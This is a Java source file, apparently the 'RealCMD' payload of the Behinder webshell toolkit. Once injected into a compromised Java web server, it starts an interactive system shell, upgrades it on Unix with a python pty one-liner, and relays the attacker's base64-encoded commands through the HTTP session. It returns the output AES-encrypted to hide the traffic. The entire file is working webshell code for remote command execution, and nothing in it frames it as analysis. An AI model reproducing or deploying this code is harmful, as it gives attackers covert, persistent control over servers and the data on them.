package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.objectweb.asm.Opcodes;

public class RealCMD implements Runnable {
    public static String bashPath;
    public static String cmd;
    public static String type;
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            result.put("msg", runCmd());
            result.put("status", "success");
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                if (result.get("msg") == null) {
                    result.put("msg", "");
                }
                write.invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            } catch (Exception e) {
            }
        } catch (Exception e2) {
            result.put("status", "fail");
            result.put("msg", e2.getMessage());
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write2 = so2.getClass().getMethod("write", byte[].class);
                if (result.get("msg") == null) {
                    result.put("msg", "");
                }
                write2.invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e3) {
            }
        } catch (Throwable th) {
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write3 = so3.getClass().getMethod("write", byte[].class);
                if (result.get("msg") == null) {
                    result.put("msg", "");
                }
                write3.invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e4) {
            }
            throw th;
        }
        return true;
    }

    public RealCMD(Object session) {
        this.Session = session;
    }

    public RealCMD() {
    }

    public String runCmd() throws Exception {
        if (type.equals("create")) {
            sessionSetAttribute(this.Session, "working", true);
            new Thread(new RealCMD(this.Session)).start();
            return "";
        } else if (type.equals("read")) {
            StringBuilder output = (StringBuilder) sessionGetAttribute(this.Session, "output");
            String result = output.toString();
            output.setLength(0);
            return result;
        } else if (type.equals("write")) {
            String input = new String(base64decode(cmd));
            BufferedWriter writer = (BufferedWriter) sessionGetAttribute(this.Session, "writer");
            writer.write(input);
            writer.flush();
            return "";
        } else if (!type.equals("stop")) {
            return "";
        } else {
            ((Process) sessionGetAttribute(this.Session, "process")).destroy();
            return "";
        }
    }

    public void run() {
        ProcessBuilder builder;
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        StringBuilder output = new StringBuilder();
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.indexOf("windows") >= 0) {
                if (bashPath == null) {
                    bashPath = "c:/windows/system32/cmd.exe";
                }
                builder = new ProcessBuilder(bashPath);
            } else {
                if (bashPath == null) {
                    bashPath = "/bin/sh";
                }
                builder = new ProcessBuilder(bashPath);
                builder.environment().put("TERM", "xterm");
            }
            builder.redirectErrorStream(true);
            Process process = builder.start();
            OutputStream stdin = process.getOutputStream();
            InputStream stdout = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(stdout, osCharset));
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
            sessionSetAttribute(this.Session, "reader", reader);
            sessionSetAttribute(this.Session, "writer", writer);
            sessionSetAttribute(this.Session, "output", output);
            sessionSetAttribute(this.Session, "process", process);
            if (os.indexOf("windows") < 0) {
                writer.write(String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath) + "\n");
                writer.flush();
            }
            byte[] buffer = new byte[Opcodes.ACC_ABSTRACT];
            while (true) {
                int length = stdout.read(buffer);
                if (length > -1) {
                    output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
                } else {
                    return;
                }
            }
        } catch (IOException e) {
            output.append(e.getMessage());
        }
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] base64decode(String text) throws Exception {
        try {
            if (System.getProperty("java.version").compareTo("1.9") >= 0) {
                getClass();
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
                return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
            }
            getClass();
            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, text);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }

    private Enumeration sessionGetAttributeNames(Object session) {
        try {
            return (Enumeration) session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", new Class[0]).invoke(session, key);
        } catch (Exception e) {
        }
    }
}
